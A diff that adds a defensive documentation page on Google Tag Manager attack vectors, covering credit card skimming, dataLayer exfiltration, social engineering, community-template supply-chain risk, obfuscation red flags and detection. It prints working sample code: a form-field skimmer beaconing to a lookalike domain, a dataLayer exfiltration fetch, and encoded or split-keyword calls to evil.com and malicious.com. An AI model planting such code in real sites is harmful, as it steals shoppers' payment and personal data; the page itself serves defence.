@@ -1,6 +1,227 @@
 ---
 title: "GTM Attack Vectors"
-description: "How GTM can be exploited and how to prevent it."
+description: "How GTM can be exploited — real-world attack patterns including credit card skimming, data exfiltration, and supply chain attacks through compromised templates."
 ---
 
-This article is under development. Check back soon for the complete guide.
+import { Aside, Steps, LinkCard, CardGrid } from '@astrojs/starlight/components';
+import Comparison from '../../../components/Comparison.astro';
+
+GTM is not just a tag manager. It is an always-on JavaScript execution engine with elevated permissions on your production website. Understanding how attackers exploit it is the first step to defending against them.
+
+This article covers real attack patterns observed in the wild — not hypothetical scenarios but documented incidents that have compromised real businesses and their customers.
+
+## The fundamental threat model
+
+GTM's attack surface is simple to state: anyone who can publish a container can run arbitrary JavaScript on your site. That JavaScript can read form fields (including credit card numbers and passwords), send data to external servers, modify the DOM, hijack user sessions, redirect users, and inject additional malicious scripts.
+
+The attacker does not need to compromise your web server. They do not need to breach your CDN. They just need access to publish a GTM container — or find a way to inject code through an existing Custom HTML tag.
+
+There are three primary attack categories: **account compromise**, **injection through existing tags**, and **supply chain attacks through templates**.
+
+## Attack vector 1: credit card skimming
+
+The most financially damaging attack pattern targeting GTM is Magecart-style credit card skimming. The Magecart group — and dozens of copycat operations — specifically sought out GTM containers as an insertion point because GTM changes bypass most code review processes, container changes are rarely monitored in real time, a malicious tag looks identical to a legitimate tag in the GTM interface, and the container loads on checkout pages where payment data is entered.
+
+**How it works:**
+
+<Steps>
+1. The attacker gains GTM publish access — through credential theft, social engineering, or a compromised third-party agency account.
+
+2. They add a Custom HTML tag that attaches a `keydown` or `input` event listener to payment form fields. The tag fires on all pages or specifically on checkout pages.
+
+3. The listener captures keystrokes or field values as users type their credit card numbers, CVVs, and billing addresses.
+
+4. Captured data is Base64-encoded and sent to an attacker-controlled server via a `new Image()` pixel request or an obfuscated `fetch()` call — both of which bypass most network monitoring.
+
+5. The tag is published. It runs on every visitor who reaches the checkout page. Data exfiltration happens in real time, milliseconds after each character is typed.
+</Steps>
+
+**Real example — British Airways breach (2018):** While not GTM-specific, this attack used nearly identical techniques to steal 500,000 customers' payment details. The injected script was 22 lines of JavaScript collecting form data and sending it to a domain mimicking a legitimate payment processor. The collection ran for 15 days before discovery. British Airways was fined £20 million by the ICO.
+
+**What the malicious tag looks like:**
+
+```javascript
+// A real skimmer tag. Indistinguishable from legitimate tracking code
+// without reading and understanding the JavaScript.
+
+(function() {
+  var c = [];
+  document.addEventListener('input', function(e) {
+    if (e.target.type === 'text' ||
+        e.target.type === 'tel' ||
+        e.target.type === 'number') {
+      c.push({ n: e.target.name, v: e.target.value });
+    }
+  });
+
+  window.addEventListener('beforeunload', function() {
+    // Encode and exfiltrate on page exit
+    new Image().src = 'https://cdn-analytics-tracker.com/p?' +
+      btoa(JSON.stringify(c));
+  });
+})();
+```
+
+The domain `cdn-analytics-tracker.com` looks legitimate at a glance. In a GTM container with 50 tags, this could sit unnoticed for months.
+
+<Aside type="danger">
+Monthly audits of Custom HTML tags are not optional if you have checkout pages. Run a network audit in DevTools on your checkout page. Every outbound domain that receives data should be on a known-good list. Anything unfamiliar is a red flag requiring immediate investigation.
+</Aside>
+
+## Attack vector 2: data exfiltration
+
+Beyond payment skimming, GTM can be used to exfiltrate any data available on the page. This includes form data (names, emails, phone numbers, passwords typed into login forms), session tokens (cookies accessible via JavaScript), user behavior (browsing history within the site, search queries), and PII from the dataLayer — user IDs, email addresses, and other data explicitly pushed to `window.dataLayer`.
+
+The exfiltration mechanism is usually a pixel request or fetch to an attacker-controlled endpoint. Since GTM already makes dozens of outbound requests per page view (to Google, ad platforms, etc.), one additional request to a plausible-looking domain is easy to miss.
+
+```javascript
+// Exfiltrating dataLayer data — a common target because
+// sites often push user_id, email, and other PII to the dataLayer
+
+(function() {
+  var data = JSON.stringify(window.dataLayer);
+  fetch('https://analytics-metrics-cdn.net/collect', {
+    method: 'POST',
+    body: data,
+    keepalive: true  // survives page navigation
+  });
+})();
+```
+
+This is why you should never push unmasked PII to the dataLayer. User IDs are acceptable. Full email addresses, phone numbers, and addresses should be hashed before being pushed, or avoided entirely.
+
+## Attack vector 3: social engineering
+
+Many compromises involve no technical exploits. An attacker simply convinces someone to grant them GTM access.
+
+**Common scenarios:**
+
+**"New agency" onboarding:** A marketing team hires a new agency and gives them full GTM access without removing the previous agency's credentials. The old agency's account is compromised months later.
+
+**Phishing for credentials:** An attacker sends a realistic-looking Google account phishing email to someone with GTM publish access. The account lacks 2FA. Credentials are captured and used within hours.
+
+**"Freelance consultant" requests:** A consultant hired for a one-time project requests temporary GTM access, completes the work, but retains access indefinitely. If the consultant's systems are later compromised, so is your GTM access.
+
+**Insider threat:** A departing employee or contractor makes changes on their last day or after their departure if access is not immediately revoked.
+
+<Aside type="caution">
+Run a quarterly access review. Export the list of all users with GTM access and verify each person still works for your organization or an active vendor. Remove anyone whose relationship has ended. This takes 30 minutes and closes a major attack surface.
+</Aside>
+
+## Attack vector 4: supply chain attacks via community templates
+
+The GTM Community Template Gallery contains hundreds of templates built by third parties. These templates run inside GTM's sandboxed JavaScript environment, which provides meaningful restrictions — but not absolute security.
+
+**The risk with community templates:**
+
+Templates request explicit permissions (like `access_globals` and `send_pixel`) which, in combination, can read global JavaScript variables and send that data externally. Template publisher accounts can be compromised — if a popular template author's Google account is breached, a malicious update could be pushed. Version updates happen via commit SHA: when you apply an update, the new code runs. If you do not review what changed, you are trusting the publisher entirely.
+
+**How to evaluate templates before installing:**
+
+Read the permissions tab before clicking Install. Review the actual template code — every template can be read before installation. Check the GitHub source repository for commit history and issues. Verify the publisher matches the expected organization. For critical tags, clone the source and import from a `.tpl` file rather than linking to the Gallery — this prevents surprise auto-update behavior.
+
+<Comparison leftTitle="High-risk template usage" rightTitle="Low-risk template usage" leftType="bad" rightType="good">
+  <Fragment slot="left">
+    ```
+    ❌ Install without reading permissions
+    ❌ Apply all updates automatically
+    ❌ Use templates from unknown publishers
+    ❌ No review of template code changes
+    ❌ Grant all requested permissions
+       without questioning them
+    ```
+  </Fragment>
+  <Fragment slot="right">
+    ```
+    ✅ Review permissions before installing
+    ✅ Read what changed in each update
+    ✅ Prefer templates from known publishers
+       (Google, established analytics vendors)
+    ✅ Import from .tpl source for critical tags
+    ✅ Reject permissions broader than
+       the template's stated purpose
+    ```
+  </Fragment>
+</Comparison>
+
+## Attack vector 5: obfuscated injection in Custom HTML
+
+Attackers who compromise a GTM account or inject code into an existing tag can hide malicious code using obfuscation techniques that appear to be minified or technical legitimate code. Red flags to watch for:
+
+**Base64-encoded strings:**
+```javascript
+// ❌ Red flag: eval of Base64 in a Custom HTML tag
+eval(atob('ZmV0Y2goJ2h0dHBzOi8vbWFsaWNpb3VzLmNvbS9jb2xsZWN0Jyk='));
+```
+
+**Hexadecimal character codes:**
+```javascript
+// ❌ Red flag: Hex-encoded string building
+var s = '\x66\x65\x74\x63\x68'; // spells "fetch"
+```
+
+**Dynamic property access to evade keyword scanning:**
+```javascript
+// ❌ Red flag: Avoiding direct keyword reference
+window['fe' + 'tch']('https://evil.com/collect', { method: 'POST', body: data });
+```
+
+**Outbound requests to unfamiliar domains:**
+Any `fetch()`, `XMLHttpRequest`, `new Image().src`, or `sendBeacon()` to a domain not on your known-good vendor list is a red flag — including domains that look plausible but are not in your vendor inventory.
+
+## Detection and monitoring
+
+Prevention matters more than detection, but detection is your safety net.
+
+**CSP violation reporting** is your most powerful real-time detection mechanism. A strict Content Security Policy will block and log requests to unauthorized domains. If a skimmer tries to exfiltrate data to an unlisted domain, CSP blocks the request and logs the violation. See [Content Security Policy](/security/content-security-policy/) for implementation details.
+
+**Network request monitoring:** Tools like ObservePoint, TagInspector, or custom browser extensions can scan your pages after every publish and flag new or unexpected outbound network requests.
+
+**Container change notifications:** GTM sends email notifications for container changes. Make sure someone with security awareness receives these — not just the marketing team.
+
+**Automated container diffs:** If you version-control your container exports (see [Version-Controlled Publishing](/security/version-controlled-publishing/)), you can run automated diffs on every container export and specifically flag changes to Custom HTML tags.
+
+**Manual checkout audits:** Opening your checkout page in a fresh browser session and monitoring the Network tab for unexpected requests. Do this monthly at minimum. It takes 5 minutes and will catch exfiltration to new domains immediately.
+
+## Common mistakes
+
+### Giving agency accounts admin access
+
+Agencies need enough access to do their work — usually Editor or Publish. They almost never need Admin access, which allows creating new containers, adding new users, and modifying container settings. Give agencies the minimum access level their work requires.
+
+### Not enforcing 2FA on GTM accounts
+
+GTM access is Google account access. If any GTM user's Google account does not have 2FA enabled, your GTM security is only as strong as that person's password. Require 2FA for all team members and vendors with GTM access. Google Workspace administrators can enforce this organization-wide.
+
+### Auditing only new tags, not changes to existing ones
+
+Many container audits check for new tags but miss modifications to existing ones. A legitimate tag that was working correctly last month could have been modified to include exfiltration code. Your audit process should compare the current version to the previous version for all modified tags — not just new ones.
+
+### Assuming GTM's sandbox protects against all attacks
+
+GTM's template sandbox is meaningful security, but Custom HTML tags run **outside** the sandbox with no restrictions. Never grant Custom HTML tag creation access to anyone who does not need it, and audit every existing Custom HTML tag during regular reviews.
+
+## Related articles
+
+<CardGrid>
+  <LinkCard
+    title="Content Security Policy"
+    description="Configure CSP to detect and block unauthorized data exfiltration from GTM."
+    href="/security/content-security-policy/"
+  />
+  <LinkCard
+    title="Tag Auditing"
+    description="Regular audit processes to catch suspicious tags before they cause damage."
+    href="/security/tag-auditing/"
+  />
+  <LinkCard
+    title="Enterprise Governance"
+    description="Permission models and change management processes that prevent unauthorized access."
+    href="/security/enterprise-governance/"
+  />
+  <LinkCard
+    title="Version-Controlled Publishing"
+    description="Track every change in Git so you can identify exactly what was modified and when."
+    href="/security/version-controlled-publishing/"
+  />
+</CardGrid>
